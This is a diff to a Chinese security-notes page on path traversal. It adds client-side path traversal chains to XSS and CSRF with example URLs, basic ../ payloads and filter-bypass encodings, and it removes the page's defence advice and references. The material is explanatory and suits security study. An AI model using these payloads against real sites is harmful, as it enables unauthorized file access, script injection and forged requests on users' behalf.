@@ -5,10 +5,38 @@
 ----------------------------------------
 目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 ``../`` 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。
 
+类型
+----------------------------------------
+
+服务器端路径遍历（Server-Side Path Traversal）
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 目标：Web服务器文件系统
++ 攻击位置：服务器端代码
++ 影响：读取/写入服务器敏感文件
+
+客户端路径遍历（Client-Side Path Traversal, CSPT）
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 目标：客户端本地文件系统
++ 攻击位置：客户端代码（JS、Electron等）
++ 影响：读取用户本地敏感文件
++ 利用方式
+    - CSPT->XSS
+        ::
+
+            The page https://example.com/static/cms/news.html takes a newsitemid as parameter
+            Then fetch the content of https://example.com/newitems/<newsitemid>
+            A text injection was also discovered in https://example.com/pricing/default.js via the cb parameter
+            Final payload is https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
+
+    - CSPT->CSRF 
+        + ``/<team>/channels/channelname?telem_action=under_control&forceRHSOpen&telem_run_id=../../../../../../api/v4/caches/invalidate``
+        + ``https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=``
+
+
 攻击载荷
 ----------------------------------------
 
-URL参数
+基本路径参数
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``../``
 - ``..\``
@@ -24,23 +52,7 @@ UNC Bypass
 
 过滤绕过
 ----------------------------------------
-- 单次替换
-    - ``...//``
+- 单次替换： ``...//``
 - URL编码
-- 16位Unicode编码
-    - ``\u002e``
-- 超长UTF-8编码
-    - ``\%e0%40%ae``
-
-防御
-----------------------------------------
-在进行文件操作相关的API前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。
-
-若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。
-
-参考链接
-----------------------------------------
-- `Directory traversal by portswigger <https://portswigger.net/web-security/file-path-traversal>`_
-- `Path Traversal by OWASP <https://www.owasp.org/index.php/Path_Traversal>`_
-- `path normalization <https://blogs.msdn.microsoft.com/jeremykuhne/2016/04/21/path-normalization/>`_
-- `Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon <https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>`_
+- 16位Unicode编码： ``\u002e``
+- UTF-8编码： ``\%e0%40%ae``
